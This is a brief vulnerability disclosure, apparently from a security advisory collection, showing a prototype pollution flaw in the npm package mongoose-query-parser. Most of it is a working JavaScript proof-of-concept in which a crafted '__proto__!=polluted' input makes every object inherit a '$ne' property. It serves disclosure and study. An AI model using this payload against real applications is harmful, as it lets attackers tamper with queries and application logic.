# mongoose-query-parser

- package name: `mongoose-query-parser`

- PoC exploit:

```javascript
const {MongooseQueryParser} = require('mongoose-query-parser');
let parser = new MongooseQueryParser();
parser.parse('__proto__!%3Dpolluted=', {});
// or parser.parse({'__proto__!=polluted': undefined}, {});
console.log(({}).$ne); // output: polluted
```